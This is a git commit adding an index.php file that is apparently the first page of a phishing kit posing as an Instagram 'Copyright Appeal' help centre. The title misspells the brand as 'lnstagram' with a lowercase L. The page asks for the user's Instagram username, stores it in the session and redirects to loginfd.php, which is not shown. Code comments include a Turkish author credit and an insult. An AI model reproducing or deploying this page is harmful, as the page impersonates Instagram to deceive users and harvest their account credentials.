d50602690032502b86f8d80f2c9a53ca812d52c4
wboranz <90263200+wboranz@users.noreply.github.com>
2021-09-12 15:59:36 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,94 @@
+<?php
+if ($_GET) {
+	$nick=$_GET["nick"];
+	session_start();
+	$_SESSION["nick"]=$nick;
+	header("location: loginfd.php?nick=$nick");
+}
+
+                     
+
+?>
+                             
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" type="text/css" href="css/index.css">
+<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
+<link rel="stylesheet" type="text/css" href="chax.css">
+<link rel="stylesheet" href="css/xss.css">
+<title>lnstagram | Help Center</title>
+<link rel="shortcut icon" href="img/tik.webp"/>
+</head>
+<body>
+</head>
+<body>
+	<header>
+		<table>
+			<tr>
+				<td><img src="https://i.hizliresim.com/lUaQMj.png" width="200"></td>
+				<td><i class="fas fa-stream"></i></td>
+			</tr>
+		</table>
+		
+	</header><br><br>
+<br><br><br>
+
+<center>
+  <form method="get">
+    <div class="container">
+    	<br>
+      <img src="https://s3.gifyu.com/images/Logo242.gif" width="300">
+      <br> <br>     
+      <h1 class="h1"> Copyright Appeal</h1>
+      
+      <p class="p">Please write your instagram username and click "Next" and fill the next form</p><br>
+        <input type="text" class="username" name="nick" required="" placeholder="@username" class="qua21"><br><br>
+        <input type="submit" value="Next" class="button"> <br>
+  <br> <br><img src="https://s4.gifyu.com/images/PicsArt_03-14-07.13.52.png" width="159px">
+   </div>
+  </form>
+</form>
+<br>
+</div>
+</center>
+<?php qenzy(4);?>
+
+<?php 
+function qenzy($spx){
+  for($int=0;$int<$spx;$int++){
+echo "<br>";
+  }
+  
+}
+//Fytron Daniel tarafından yapılmıştır 
+//bir tane siteden çekip onarılmış aksini idda eden orospu cocogudur.
+//instagram.com/fytronq
+?>
+
+</body>
+<br><br><br><center>
+<div class="bottom"><br>
+
+	<h1 class="bottom-h1">Download for<br>IOS / Android</h1><br>
+
+	<img src="image/bottom.jpeg" alt="Shop" width="300">
+
+<br>
+<br>
+
+<br>
+<img src="image/fb.png">
+
+
+
+</div>
+</center>
+</body>
+<style type="text/css">
+	
+</style>
+</html>
+</html>
